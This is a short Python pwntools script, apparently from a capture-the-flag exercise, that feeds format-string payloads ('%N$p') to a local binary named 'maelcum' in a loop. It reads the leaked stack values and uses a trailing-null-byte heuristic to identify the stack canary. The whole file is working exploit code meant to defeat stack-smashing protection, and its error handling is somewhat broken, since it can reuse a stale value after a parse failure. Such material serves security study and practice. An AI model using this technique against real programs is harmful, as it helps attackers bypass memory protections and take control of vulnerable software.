from pwn import *

context.binary = './maelcum'
data = []

for i in range(1, 400):
    p = process('./maelcum')
    payload = f'%{i}$p'
    bload = bytes(payload.encode())
    p.sendline(bload)
    p.recvuntil(b'Logging relay tag: ')
    try:
        leak = p.recvline().strip()
        canary = int(leak, 16)
        data.append(canary)
    except ValueError:
        print('not num')
    if data:
        for j in range(0, len(data) - 1):
            if data[j] == canary:
                temp = str(hex(data[j]))
                if len(temp) > 14 and temp[-2:] == '00':
                    log.success(f'{hex(canary)}, THIS IS THE CANARY')
                    exit()
            else:
                if len(str(hex(canary))) > 14 and str(hex(canary))[-2:] == '00':
                    log.success(f'{hex(canary)}, THIS IS MAYBE THE CANARY')
                    break
    log.success(f"Supposed canary ({i}): {hex(canary)}")
    p.clean()
    p.kill()
